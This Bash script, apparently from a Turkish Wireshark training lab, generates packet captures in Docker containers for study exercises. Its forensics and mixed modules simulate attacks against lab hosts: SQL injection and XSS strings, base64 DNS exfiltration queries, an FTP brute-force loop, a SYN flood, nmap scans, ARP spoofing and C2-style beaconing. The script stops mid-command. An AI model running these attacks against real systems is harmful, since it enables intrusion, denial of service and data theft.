#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

CREDENTIALS_FILE="${PROJECT_DIR}/shared/credentials.env"
if [ -f "${CREDENTIALS_FILE}" ]; then
    set -a
    source "${CREDENTIALS_FILE}"
    set +a
else
    echo "[HATA] ${CREDENTIALS_FILE} bulunamadı!"
    exit 1
fi

MODULE="${1:-all}"

# Cleanup function for trap: ensures tcpdump stops and netem removed on exit/interrupt
cleanup_on_exit() {
    docker exec shark-tank-client pkill tcpdump 2>/dev/null || true
    docker exec shark-tank-attacker pkill tcpdump 2>/dev/null || true
    docker exec shark-tank-tcp-echo tc qdisc del dev eth0 root 2>/dev/null || true
}
trap cleanup_on_exit EXIT INT TERM

start_capture() {
    local name="$1"
    echo "[CAPTURE] Başlatılıyor: ${name}"
    docker exec -d shark-tank-client tcpdump -i eth0 --immediate-mode -w "/pcaps/${name}.pcap" >/dev/null 2>&1 || true
    docker exec -d shark-tank-attacker tcpdump -i eth0 --immediate-mode -w "/tmp/${name}-attacker.pcap" >/dev/null 2>&1 || true
    sleep 1
}

stop_capture() {
    echo "[CAPTURE] Durduruluyor..."
    docker exec shark-tank-client pkill tcpdump 2>/dev/null || true
    docker exec shark-tank-attacker pkill tcpdump 2>/dev/null || true
    sleep 2
}

merge_attacker_pcap() {
    local name="$1"
    local client_pcap="${PROJECT_DIR}/shared/pcaps/${name}.pcap"
    local attacker_pcap="/tmp/${name}-attacker-merged.pcap"
    docker cp "shark-tank-attacker:/tmp/${name}-attacker.pcap" "${attacker_pcap}" 2>/dev/null || return 0
    if [ -f "${attacker_pcap}" ]; then
        CLIENT_PCAP="${client_pcap}" ATTACKER_PCAP="${attacker_pcap}" python3 -c "
import struct, sys, os

client_pcap = os.environ['CLIENT_PCAP']
attacker_pcap = os.environ['ATTACKER_PCAP']

def read_pcap(f):
    pkts = []
    hdr = f.read(24)
    if len(hdr) < 24: return hdr, []
    while True:
        ph = f.read(16)
        if len(ph) < 16: break
        ts_sec, ts_usec, incl_len, _ = struct.unpack('<IIII', ph)
        data = f.read(incl_len)
        if len(data) < incl_len: break
        pkts.append((ts_sec, ts_usec, data))
    return hdr, pkts

with open(client_pcap, 'rb') as f1:
    ghdr, pkts1 = read_pcap(f1)
with open(attacker_pcap, 'rb') as f2:
    _, pkts2 = read_pcap(f2)

all_pkts = pkts1 + pkts2
all_pkts.sort(key=lambda x: (x[0], x[1]))

with open(client_pcap, 'wb') as out:
    out.write(ghdr)
    for ts_sec, ts_usec, data in all_pkts:
        out.write(struct.pack('<IIII', ts_sec, ts_usec, len(data), len(data)))
        out.write(data)
" 2>/dev/null || true
        rm -f "${attacker_pcap}"
    fi
}

wait_for_service() {
    local host="$1"
    local port="$2"
    local proto="${3:-tcp}"
    local nc_opts="-z -w 1"
    [ "$proto" = "udp" ] && nc_opts="-u -z -w 1"
    local max=15
    local count=0
    while ! docker exec shark-tank-client nc $nc_opts "$host" "$port" 2>/dev/null; do
        count=$((count + 1))
        if [ $count -ge $max ]; then
            echo "  [UYARI] $host:$port ($proto) ulaşılamadı, devam ediliyor..."
            return 1
        fi
        sleep 1
    done
    return 0
}

generate_http() {
    echo ""
    echo "=== HTTP Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.10 80
    start_capture "module-13-http"

    echo "  GET / (ana sayfa)..."
    docker exec shark-tank-client curl -s http://172.50.2.10/ > /dev/null
    sleep 0.3

    echo "  GET /api/data (JSON API)..."
    docker exec shark-tank-client curl -s http://172.50.2.10/api/data > /dev/null
    sleep 0.3

    echo "  GET /api/users..."
    docker exec shark-tank-client curl -s http://172.50.2.10/api/users > /dev/null
    sleep 0.3

    echo "  GET /secret (403 Forbidden)..."
    docker exec shark-tank-client curl -s http://172.50.2.10/secret > /dev/null
    sleep 0.3

    echo "  POST /auth (form verisi - şifre içerir)..."
    docker exec shark-tank-client curl -s -X POST -d "username=${HTTP_ADMIN_USER}&password=${HTTP_ADMIN_PASS}" http://172.50.2.10/auth > /dev/null
    sleep 0.3

    echo "  POST /auth (hatali giriş)..."
    docker exec shark-tank-client curl -s -X POST -d "username=${HTTP_GUEST_USER}&password=${HTTP_GUEST_PASS}" http://172.50.2.10/auth > /dev/null
    sleep 0.3

    echo "  GET /large (büyük response - TCP segmentation)..."
    docker exec shark-tank-client curl -s http://172.50.2.10/large > /dev/null
    sleep 0.3

    echo "  GET /redirect (302)..."
    docker exec shark-tank-client curl -s -L http://172.50.2.10/redirect > /dev/null
    sleep 0.3

    echo "  GET /headers (özel header'lar)..."
    docker exec shark-tank-client curl -s -H "X-Forwarded-For: 10.0.0.1" -H "Cookie: session=abc123" http://172.50.2.10/headers > /dev/null
    sleep 0.3

    echo "  GET /nonexistent (404)..."
    docker exec shark-tank-client curl -s http://172.50.2.10/nonexistent > /dev/null
    sleep 0.3

    echo "  HEAD / ..."
    docker exec shark-tank-client curl -s -I http://172.50.2.10/ > /dev/null
    sleep 0.3

    echo "  Şüpheli istekler (SQL injection/XSS simülasyonu)..."
    docker exec shark-tank-client curl -s "http://172.50.2.10/api/data?id=1'+OR+1=1--" > /dev/null 2>&1 || true
    docker exec shark-tank-client curl -s "http://172.50.2.10/api/data?search=<script>alert(1)</script>" > /dev/null 2>&1 || true

    stop_capture
    echo "  Pcap: shared/pcaps/module-13-http.pcap"
}

generate_dns() {
    echo ""
    echo "=== DNS Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.11 53
    start_capture "module-12-dns"

    echo "  A kaydı: web.shark-tank.local..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local A +short
    sleep 0.3

    echo "  A kaydı: secure.shark-tank.local..."
    docker exec shark-tank-client dig @172.50.2.11 secure.shark-tank.local A +short
    sleep 0.3

    echo "  A kaydı: target.shark-tank.local..."
    docker exec shark-tank-client dig @172.50.2.11 target.shark-tank.local A +short
    sleep 0.3

    echo "  CNAME kaydı: www.shark-tank.local..."
    docker exec shark-tank-client dig @172.50.2.11 www.shark-tank.local +short
    sleep 0.3

    echo "  MX kaydı: mail.shark-tank.local..."
    docker exec shark-tank-client dig @172.50.2.11 mail.shark-tank.local MX +short
    sleep 0.3

    echo "  NS kaydı: shark-tank.local..."
    docker exec shark-tank-client dig @172.50.2.11 shark-tank.local NS +short
    sleep 0.3

    echo "  AAAA kaydı (IPv6 adresi)..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local AAAA +short
    sleep 0.3

    echo "  Olmayan domain (NXDOMAIN)..."
    docker exec shark-tank-client dig @172.50.2.11 nonexistent.shark-tank.local +short
    sleep 0.3

    echo "  Dış domain: google.com..."
    docker exec shark-tank-client dig @172.50.2.11 google.com A +short
    sleep 0.3

    echo "  Dış domain: github.com..."
    docker exec shark-tank-client dig @172.50.2.11 github.com A +short
    sleep 0.3

    echo "  TXT kaydı denemesi..."
    docker exec shark-tank-client dig @172.50.2.11 shark-tank.local TXT +short
    sleep 0.3

    echo "  drill ile sorgu: echo.shark-tank.local..."
    docker exec shark-tank-client drill @172.50.2.11 echo.shark-tank.local A

    echo "  DNS exfiltration simülasyonu (uzun subdomain'ler)..."
    docker exec shark-tank-client dig @172.50.2.11 "c2NhcmFhcmFhLXNheWEtZGFsZ2EtZGU.bXV0ZXNpbGltZS0xMjM0.dmlsbGEtb25lLXNheWk.exfil.shark-tank.local" > /dev/null 2>&1 || true
    sleep 0.3
    docker exec shark-tank-client dig @172.50.2.11 "dG9wbHUtYmlyLXNpcmluLWRlLWthbGUtYmlsZS1kYXRhLWdvdGVy.dmlsbGEtaWtpLWRhaGE.bW9yZWQtZGF0YQ.exfil.shark-tank.local" > /dev/null 2>&1 || true
    sleep 0.3
    docker exec shark-tank-client dig @172.50.2.11 "Y2FmZS1hZGFtLWRhaGEtYmlsLW1peW9yLXRhbWEtZGUua2F5YmV0LWRlZ2lsLWNvZ3U.exfil.shark-tank.local" > /dev/null 2>&1 || true
    sleep 0.3

    stop_capture
    echo "  Pcap: shared/pcaps/module-12-dns.pcap"
}

generate_tcp() {
    echo ""
    echo "=== TCP Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.12 8080
    start_capture "module-08-tcp"

    echo "  TCP echo server'a bağlanıyor (port 8080)..."
    docker exec shark-tank-client bash -c 'echo "Merhaba Shark-Tank" | nc -w 2 172.50.2.12 8080'
    sleep 0.5

    echo "  Birden fazla mesaj gönderiliyor..."
    docker exec shark-tank-client bash -c 'for i in 1 2 3 4 5; do echo "Mesaj $i" | nc -w 1 172.50.2.12 8080; sleep 0.3; done'
    sleep 0.5

    echo "  Uzun veri gönderiliyor..."
    docker exec shark-tank-client bash -c 'python3 -c "print(\"A\"*2000)" 2>/dev/null | nc -w 2 172.50.2.12 8080'
    sleep 0.5

    echo "  Port tarama (SYN scan - attacker'dan)..."
    docker exec shark-tank-attacker nmap -sS -p 21,22,25,80,443,8080,3306,5432 172.50.2.12 > /dev/null 2>&1 || true

    echo "  RST testi (kapalı port)..."
    docker exec shark-tank-attacker bash -c 'echo "test" | nc -w 1 172.50.2.12 22 2>/dev/null || true'

    stop_capture
    merge_attacker_pcap "module-08-tcp"
    echo "  Pcap: shared/pcaps/module-08-tcp.pcap"
}

generate_tls() {
    echo ""
    echo "=== TLS Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.13 443

    echo "  SSL keylog dosyası temizleniyor..."
    docker exec shark-tank-client sh -c 'rm -f /tmp/sslkeys.log && touch /tmp/sslkeys.log'

    start_capture "module-16-tls"

    echo "  HTTPS GET / (ana sayfa)..."
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl -sk https://172.50.2.13/' > /dev/null
    sleep 0.5

    echo "  HTTPS GET /secure-api..."
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl -sk https://172.50.2.13/secure-api' > /dev/null
    sleep 0.5

    echo "  HTTPS GET /secure-data..."
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl -sk https://172.50.2.13/secure-data' > /dev/null
    sleep 0.5

    echo "  HTTPS GET /cert-info..."
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl -sk https://172.50.2.13/cert-info' > /dev/null
    sleep 0.5

    echo "  TLS sertifika bilgisi..."
    docker exec shark-tank-client openssl s_client -connect 172.50.2.13:443 -servername secure.shark-tank.local </dev/null 2>/dev/null | head -20

    echo "  HTTP vs HTTPS karşılaştırma (aynı anda)..."
    docker exec shark-tank-client curl -s http://172.50.2.10/api/data > /dev/null &
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl -sk https://172.50.2.13/secure-api' > /dev/null &
    wait

    echo "  HTTPS POST..."
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl -sk -X POST -d "secret_data=hidden_value" https://172.50.2.13/secure-api' > /dev/null 2>&1 || true

    echo "  TLS 1.2 zorlama (decryption için)..."
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl --tlsv1.2 --tls-max 1.2 -sk https://172.50.2.13/secure-data' > /dev/null 2>&1 || true
    sleep 0.5
    docker exec shark-tank-client sh -c 'SSLKEYLOGFILE=/tmp/sslkeys.log curl --tlsv1.2 --tls-max 1.2 -sk https://172.50.2.13/secure-api' > /dev/null 2>&1 || true

    stop_capture

    echo "  SSL keylog dosyası kopyalanıyor..."
    docker cp shark-tank-client:/tmp/sslkeys.log "${PROJECT_DIR}/shared/certs/sslkeys.log" 2>/dev/null || true

    echo "  Pcap: shared/pcaps/module-16-tls.pcap"
    echo "  Keylog: shared/certs/sslkeys.log"
}

generate_icmp() {
    echo ""
    echo "=== ICMP Trafiği Üretiliyor ==="
    start_capture "module-05-icmp"

    echo "  Ping 172.50.2.14 (4 packet)..."
    docker exec shark-tank-client ping -c 4 172.50.2.14
    sleep 0.5

    echo "  Ping 172.50.2.10 (web server)..."
    docker exec shark-tank-client ping -c 3 172.50.2.10
    sleep 0.5

    echo "  Ping olmayan IP (timeout)..."
    docker exec shark-tank-client ping -c 2 -W 2 172.50.2.99
    sleep 0.5

    echo "  Farklı boyutlarda ping..."
    docker exec shark-tank-client ping -c 2 -s 64 172.50.2.14
    docker exec shark-tank-client ping -c 2 -s 512 172.50.2.14
    docker exec shark-tank-client ping -c 2 -s 1400 172.50.2.14

    stop_capture
    echo "  Pcap: shared/pcaps/module-05-icmp.pcap"
}

generate_ftp() {
    echo ""
    echo "=== FTP Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.15 21
    start_capture "module-14-ftp"

    echo "  FTP login (credentials: ${FTP_USER} / ${FTP_PASS})..."
    docker exec shark-tank-client curl -s -u "${FTP_USER}:${FTP_PASS}" ftp://172.50.2.15/ > /dev/null 2>&1 || true
    sleep 1

    echo "  FTP dosya listesi..."
    docker exec shark-tank-client curl -s -u "${FTP_USER}:${FTP_PASS}" ftp://172.50.2.15/ 2>/dev/null || true
    sleep 1

    echo "  FTP dosya yükleme..."
    docker exec shark-tank-client bash -c "echo 'Shark-Tank Lab Test File - Bu dosya FTP ile yüklendi.' > /tmp/test-upload.txt && curl -s -T /tmp/test-upload.txt -u '${FTP_USER}:${FTP_PASS}' ftp://172.50.2.15/ 2>/dev/null || true"
    sleep 1

    echo "  FTP dosya indirme..."
    docker exec shark-tank-client curl -s -u "${FTP_USER}:${FTP_PASS}" ftp://172.50.2.15/test-upload.txt 2>/dev/null || true
    sleep 1

    echo "  Hatali FTP login (yanlış şifre)..."
    docker exec shark-tank-client curl -s -u "${FTP_USER}:${FTP_WRONG_PASS}" ftp://172.50.2.15/ 2>/dev/null || true
    sleep 1

    echo "  FTP raw komutlar (nc ile)..."
    docker exec shark-tank-client bash -c "printf 'USER ${FTP_USER}\r\nPASS ${FTP_PASS}\r\nSYST\r\nPWD\r\nPASV\r\nLIST\r\nQUIT\r\n' | nc -w 5 172.50.2.15 21" 2>/dev/null || true
    sleep 0.5

    echo "  FTP Active Mode (PORT komutu ile)..."
    docker exec shark-tank-client bash -c "printf 'USER ${FTP_USER}\r\nPASS ${FTP_PASS}\r\nPORT 172,50,2,100,4,210\r\nLIST\r\nQUIT\r\n' | nc -w 5 172.50.2.15 21" 2>/dev/null || true

    stop_capture
    echo "  Pcap: shared/pcaps/module-14-ftp.pcap"
}

generate_voip() {
    echo ""
    echo "=== VoIP Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.22 5060 udp
    start_capture "module-22-voip"

    echo "  SIP REGISTER (1001) + REGISTER (1000)..."
    docker exec shark-tank-client python3 /sip-client.py 1001 ${SIP_PASS_1001} 1000 register 2>/dev/null || true
    sleep 1
    docker exec shark-tank-client python3 /sip-client.py 1000 ${SIP_PASS_1000} 1001 register 2>/dev/null || true
    sleep 1

    echo "  SIP INVITE + BYE (1000 → 1001)..."
    docker exec shark-tank-client python3 /sip-client.py 1000 ${SIP_PASS_1000} 1001 full 2>/dev/null || true
    sleep 2

    echo "  SIP INVITE + BYE (1001 → 1000)..."
    docker exec shark-tank-client python3 /sip-client.py 1001 ${SIP_PASS_1001} 1000 full 2>/dev/null || true

    stop_capture
    echo "  Pcap: shared/pcaps/module-22-voip.pcap"
}

generate_forensics() {
    echo ""
    echo "=== FORENSICS Trafiği Üretiliyor ==="
    start_capture "module-25-forensics"

    echo "  [1/7] Normal HTTP istekleri..."
    docker exec shark-tank-client curl -s http://172.50.2.10/ > /dev/null
    docker exec shark-tank-client curl -s -X POST -d "username=${HTTP_EMPLOYEE_USER}&password=${HTTP_EMPLOYEE_PASS}" http://172.50.2.10/auth > /dev/null
    docker exec shark-tank-client curl -s http://172.50.2.10/api/users > /dev/null
    sleep 1

    echo "  [2/7] Veri sızıntısı senaryosu (büyük JSON response)..."
    docker exec shark-tank-client curl -s http://172.50.2.10/api/users > /dev/null
    docker exec shark-tank-client curl -s http://172.50.2.10/large > /dev/null
    sleep 1

    echo "  [3/7] DNS sorguları (normal + şüpheli)..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local > /dev/null
    docker exec shark-tank-client dig @172.50.2.11 secure.shark-tank.local > /dev/null
    docker exec shark-tank-client dig @172.50.2.11 google.com > /dev/null
    sleep 1

    echo "  [3.5/7] Attacker: FTP brute force..."
    for pass in wrong1 wrong2 wrong3 wrongpassword admin123 letmein pass123; do
        docker exec shark-tank-attacker curl -s --connect-timeout 3 -u "${FTP_USER}:${pass}" ftp://172.50.2.15/ > /dev/null 2>&1 || true
        sleep 0.5
    done
    docker exec shark-tank-attacker curl -s -u "${FTP_USER}:${FTP_PASS}" ftp://172.50.2.15/ > /dev/null 2>&1 || true

    echo "  [3.6/7] Attacker: DNS exfiltration..."
    docker exec shark-tank-attacker dig @172.50.2.11 "c2F1c2FnZS1kZW5lbWUtb3J0YWxhLWthbHljaS1iaXQtZGF0YQ.exfil.shark-tank.local" > /dev/null 2>&1 || true
    docker exec shark-tank-attacker dig @172.50.2.11 "c2lyaS1iaWxpci1maWxhbi1lbWFuaWV0LWRhaGEtdHVrZW4.exfil.shark-tank.local" > /dev/null 2>&1 || true

    echo "  [4/7] C2 beaconing (düzenli aralıklı callback)..."
    for i in $(seq 1 6); do
        docker exec shark-tank-attacker curl -s -A "Mozilla/5.0 (Beacon)" "http://172.50.2.10/api/data?sid=$i" > /dev/null 2>&1 || true
        sleep 2
    done

    echo "  [5/7] ICMP (reconnaissance)..."
    docker exec shark-tank-client ping -c 2 172.50.2.10 > /dev/null
    docker exec shark-tank-client ping -c 2 172.50.2.14 > /dev/null
    sleep 1

    echo "  [6/7] Attacker: SYN scan (tüm servisler)..."
    docker exec shark-tank-attacker nmap -sS -p 21,22,25,53,80,443,8080,3306,5432 172.50.2.10 > /dev/null 2>&1 || true
    docker exec shark-tank-attacker nmap -sS -p 21,22,25,53,80,443,8080 172.50.2.13 > /dev/null 2>&1 || true
    docker exec shark-tank-attacker nmap -sS -p 21,22,25,53,80,443,8080 172.50.2.15 > /dev/null 2>&1 || true
    sleep 2

    echo "  [7/7] Attacker: SYN flood (web sunucuya)..."
    docker exec shark-tank-attacker bash -c 'for i in $(seq 1 30); do echo "SYN" | nc -w 0.1 172.50.2.10 80 2>/dev/null & done; wait' 2>/dev/null || true
    sleep 1

    echo "  Attacker: Şüpheli HTTP istekleri..."
    docker exec shark-tank-attacker curl -s "http://172.50.2.10/api/data?id=1'+UNION+SELECT+*+FROM+users--" > /dev/null 2>&1 || true
    docker exec shark-tank-attacker curl -s "http://172.50.2.10/api/data?q=<script>document.cookie</script>" > /dev/null 2>&1 || true
    docker exec shark-tank-attacker curl -s -A "Sqlmap/1.5" http://172.50.2.10/ > /dev/null 2>&1 || true
    sleep 1

    stop_capture
    merge_attacker_pcap "module-25-forensics"
    echo "  Pcap: shared/pcaps/module-25-forensics.pcap"
    echo ""
    echo "=== Forensics Soruları ==="
    echo "  1. Admin kullanıcısının şifresi nedir?"
    echo "  2. Employee kullanıcısının şifresi nedir?"
    echo "  3. Attacker hangi IP'lerden port scan yaptı?"
    echo "  4. SYN flood saldırısı kaç paketten oluşuyor?"
    echo "  5. SQL injection girişimi hangi URL'de?"
    echo "  6. XSS girişimi hangi URL'de?"
    echo "  7. Şüpheli User-Agent hangisi?"
    echo "  8. C2 benzeri düzenli bağlantı kaç kez tekrarlandı?"
    echo "  9. FTP ile hangi dosya transfer edildi?"
    echo "  10. Toplam kaç farklı protokol görüldü?"
}

generate_mixed() {
    echo ""
    echo "=== KARIŞIK Trafik (Sınav Pratiği) ==="
    start_capture "module-24-exam-practice"

    echo "  [1/7] HTTP istekleri..."
    docker exec shark-tank-client curl -s http://172.50.2.10/ > /dev/null
    docker exec shark-tank-client curl -s http://172.50.2.10/api/data > /dev/null
    docker exec shark-tank-client curl -s -X POST -d "username=${HTTP_ADMIN_USER}&password=${HTTP_ADMIN_PASS}" http://172.50.2.10/auth > /dev/null
    sleep 1

    echo "  [2/7] DNS sorguları..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local > /dev/null
    docker exec shark-tank-client dig @172.50.2.11 secure.shark-tank.local > /dev/null
    docker exec shark-tank-client dig @172.50.2.11 google.com > /dev/null
    docker exec shark-tank-client dig @172.50.2.11 nonexistent.shark-tank.local > /dev/null
    sleep 1

    echo "  [3/7] HTTPS istekleri..."
    docker exec shark-tank-client curl -sk https://172.50.2.13/secure-data > /dev/null
    sleep 1

    echo "  [4/7] ICMP..."
    docker exec shark-tank-client ping -c 3 172.50.2.14 > /dev/null
    sleep 1

    echo "  [5/7] TCP echo..."
    docker exec shark-tank-client bash -c 'echo "test" | nc -w 1 172.50.2.12 8080'
    sleep 1

    echo "  [6/7] FTP..."
    wait_for_service 172.50.2.15 21 || true
    docker exec shark-tank-client curl -s -u "${FTP_USER}:${FTP_PASS}" ftp://172.50.2.15/ > /dev/null 2>&1 || true
    sleep 1

    echo "  [7/8] Attacker: port scan + SYN flood..."
    docker exec shark-tank-attacker nmap -sS -p 21,22,25,80,443,8080,3306 172.50.2.10 > /dev/null 2>&1 || true
    docker exec shark-tank-attacker nmap -sT -p 80,443 172.50.2.13 > /dev/null 2>&1 || true
    docker exec shark-tank-attacker bash -c 'for i in $(seq 1 20); do echo "SYN" | nc -w 0.1 172.50.2.10 80 2>/dev/null & done; wait' 2>/dev/null || true
    sleep 1

    echo "  [8/8] C2 beaconing (düzenli aralıklı callback)..."
    for i in $(seq 1 5); do
        docker exec shark-tank-attacker curl -s -A "Mozilla/5.0 (Beacon)" "http://172.50.2.10/api/data?sid=$i" > /dev/null 2>&1 || true
        sleep 2
    done

    stop_capture
    merge_attacker_pcap "module-24-exam-practice"
    echo "  Pcap: shared/pcaps/module-24-exam-practice.pcap"
    echo ""
    echo "=== Sınav Soruları ==="
    echo "  1. Kaç farklı protokol görüyorsun?"
    echo "  2. Admin kullanıcısının şifresi nedir?"
    echo "  3. Port scan hangi IP'den geldi?"
    echo "  4. DNS ile hangi domainler sorgulandı?"
    echo "  5. TLS handshake'de hangi cipher suite seçildi?"
    echo "  6. SYN flood saldırısı kaç paket içeriyor?"
    echo "  7. FTP ile gönderilen kullanıcı adı ve şifre nedir?"
    echo "  8. Hangi DNS sorgusu NXDOMAIN hatası aldi?"
}

generate_dhcp() {
    echo ""
    echo "=== DHCP Trafiği Üretiliyor ==="
    if ! docker ps --format '{{.Names}}' | grep -q 'shark-tank-dhcp-client'; then
        echo "  [HATA] DHCP container'ları çalışmıyor. make start çalıştırın."
        return 1
    fi

    echo "  Capture başlatılıyor..."
    docker exec -d shark-tank-dhcp-client tcpdump -i eth0 -w "/pcaps/module-04-dhcp.pcap" >/dev/null 2>&1 || true
    sleep 1

    echo "  DHCP isteği gönderiliyor (udhcpc)..."
    docker exec shark-tank-dhcp-client udhcpc -i eth0 -n 2>/dev/null || true
    sleep 2

    echo "  İkinci DHCP isteği (renew simülasyonu)..."
    docker exec shark-tank-dhcp-client udhcpc -i eth0 -n -R 2>/dev/null || true
    sleep 1

    echo "  Capture durduruluyor..."
    docker exec shark-tank-dhcp-client pkill tcpdump 2>/dev/null || true
    sleep 1

    docker cp "shark-tank-dhcp-client:/pcaps/module-04-dhcp.pcap" "${PROJECT_DIR}/shared/pcaps/module-04-dhcp.pcap" 2>/dev/null || true

    echo "  Pcap: shared/pcaps/module-04-dhcp.pcap"
}

generate_arp() {
    echo ""
    echo "=== ARP Trafiği Üretiliyor ==="
    start_capture "module-03-arp"

    echo "  ARP cache temizleniyor..."
    docker exec shark-tank-client ip neigh flush dev eth0 2>/dev/null || true
    docker exec shark-tank-attacker ip neigh flush dev eth0 2>/dev/null || true
    sleep 0.5

    echo "  ARP sorguları (ping ile tetiklenir)..."
    docker exec shark-tank-client ping -c 2 172.50.2.10 > /dev/null
    sleep 0.5
    docker exec shark-tank-client ip neigh flush dev eth0 2>/dev/null || true
    docker exec shark-tank-client ping -c 2 172.50.2.14 > /dev/null
    sleep 0.5

    echo "  ARP spoofing simülasyonu (attacker aynı IP'ye cevap veriyor)..."
    docker exec shark-tank-client ip neigh flush dev eth0 2>/dev/null || true
    docker exec shark-tank-attacker bash -c 'arping -c 3 -S 172.50.2.10 172.50.2.100 2>/dev/null || true'
    sleep 1

    echo "  Gratuitous ARP..."
    docker exec shark-tank-client bash -c 'arping -c 3 -A -I eth0 172.50.2.100 2>/dev/null || true'
    sleep 0.5

    stop_capture
    merge_attacker_pcap "module-03-arp"
    echo "  Pcap: shared/pcaps/module-03-arp.pcap"
}

generate_basics() {
    echo ""
    echo "=== Temel Trafik Üretiliyor ==="
    start_capture "module-01-basics"

    echo "  HTTP istek..."
    docker exec shark-tank-client curl -s http://172.50.2.10/ > /dev/null
    sleep 0.3

    echo "  DNS sorgu..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local > /dev/null
    sleep 0.3

    echo "  ICMP ping..."
    docker exec shark-tank-client ping -c 3 172.50.2.14 > /dev/null
    sleep 0.3

    echo "  TCP echo..."
    docker exec shark-tank-client bash -c 'echo "Merhaba" | nc -w 2 172.50.2.12 8080'
    sleep 0.3

    stop_capture
    echo "  Pcap: shared/pcaps/module-01-basics.pcap"
}

generate_udp() {
    echo ""
    echo "=== UDP Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.17 9090 udp
    start_capture "module-10-udp"

    echo "  UDP echo server'a mesaj gönderiliyor..."
    docker exec shark-tank-client bash -c 'echo "UDP Test Mesajı" | nc -u -w 2 172.50.2.17 9090'
    sleep 0.5

    echo "  Birden fazla UDP mesaj..."
    docker exec shark-tank-client bash -c 'for i in 1 2 3 4 5; do echo "UDP Paket $i" | nc -u -w 1 172.50.2.17 9090; sleep 0.2; done'
    sleep 0.5

    echo "  DNS over UDP (zaten var ama yakalanıyor)..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local > /dev/null
    sleep 0.3

    echo "  UDP kapalı port testi..."
    docker exec shark-tank-client bash -c 'echo "test" | nc -u -w 1 172.50.2.17 9999 2>/dev/null || true'
    sleep 0.5

    stop_capture
    echo "  Pcap: shared/pcaps/module-10-udp.pcap"
}

generate_ipv6() {
    echo ""
    echo "=== IPv6 Trafiği Üretiliyor ==="
    start_capture "module-07-ipv6"

    echo "  IPv6 adres gösterimi..."
    docker exec shark-tank-client ip -6 addr show eth0 2>/dev/null || true
    sleep 0.3

    echo "  ICMPv6 Echo (ping6) ..."
    docker exec shark-tank-client ping6 -c 3 fd00:2::14 2>/dev/null || true
    sleep 1

    echo "  IPv6 Fragment Extension Header (büyük ping)..."
    docker exec shark-tank-client ping6 -c 2 -s 4000 fd00:2::14 2>/dev/null || true
    sleep 0.5

    echo "  IPv6 traceroute..."
    docker exec shark-tank-client traceroute6 fd00:2::14 2>/dev/null || true
    sleep 1

    echo "  AAAA DNS kaydı sorgusu..."
    docker exec shark-tank-client dig @172.50.2.11 web.shark-tank.local AAAA > /dev/null 2>&1 || true
    sleep 0.3

    echo "  Router Advertisement (ICMPv6 Type 134)..."
    docker exec shark-tank-icmp-target apk add python3 > /dev/null 2>&1 || true
    docker exec shark-tank-icmp-target python3 -c "
import socket, struct
s = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
ra = struct.pack('!BBH BBH II', 134, 0, 0, 64, 0, 1800, 0, 0)
prefix = socket.inet_pton(socket.AF_INET6, 'fd00:2::')
opt = struct.pack('!BBBB II', 3, 4, 64, 0xC0, 300, 120) + b'\x00'*4 + prefix
s.sendto(ra + opt, ('ff02::1', 0, 0, 0))
" 2>/dev/null || true
    sleep 0.5

    stop_capture
    echo "  Pcap: shared/pcaps/module-07-ipv6.pcap"
}

generate_fragmentation() {
    echo ""
    echo "=== IP Fragmentation Trafiği Üretiliyor ==="
    start_capture "module-06-fragmentation"

    echo "  Büyük ping (fragmentation tetikleme, MTU aşımı)..."
    docker exec shark-tank-client ping -c 2 -s 3000 172.50.2.14 2>/dev/null || true
    sleep 0.5

    echo "  Daha büyük ping..."
    docker exec shark-tank-client ping -c 2 -s 5000 172.50.2.14 2>/dev/null || true
    sleep 0.5

    echo "  Normal ping (MTU altı, fragment yok)..."
    docker exec shark-tank-client ping -c 2 -s 1000 172.50.2.14 2>/dev/null || true
    sleep 0.5

    echo "  DF flag set (fragmentation forbidden)..."
    docker exec shark-tank-client ping -c 2 -s 3000 -M do 172.50.2.14 2>/dev/null || true
    sleep 0.5

    echo "  UDP büyük paket (fragmentation)..."
    docker exec shark-tank-client bash -c 'python3 -c "print(\"X\"*4000)" 2>/dev/null | nc -u -w 2 172.50.2.17 9090'
    sleep 0.5

    stop_capture
    echo "  Pcap: shared/pcaps/module-06-fragmentation.pcap"
}

generate_email() {
    echo ""
    echo "=== Email Trafiği Üretiliyor ==="
    wait_for_service 172.50.2.16 1025
    wait_for_service 172.50.2.18 110
    start_capture "module-15-email"

    echo "  1/4 SMTP email gönderimi..."
    docker exec shark-tank-client bash -c '
    (
    echo "EHLO shark-tank-client"
    sleep 0.5
    echo "MAIL FROM:<${IMAP_USER}@shark-tank.local>"
    sleep 0.3
    echo "RCPT TO:<destek@shark-tank.local>"
    sleep 0.3
    echo "DATA"
    sleep 0.3
    echo "From: ${IMAP_USER}@shark-tank.local"
    echo "To: destek@shark-tank.local"
    echo "Subject: Aylık Değerlendirme Raporu"
    echo ""
    echo "Aylik network degerlendirme raporu ektedir."
    echo "Detaylar icin guvenli kanal kullanin."
    echo "."
    sleep 0.3
    echo "QUIT"
    ) | nc -w 5 172.50.2.16 1025' 2>/dev/null || true
    sleep 1

    echo "  2/4 SMTP AUTH LOGIN (base64 auth) via IMAP submission..."
    docker exec shark-tank-client bash -c '
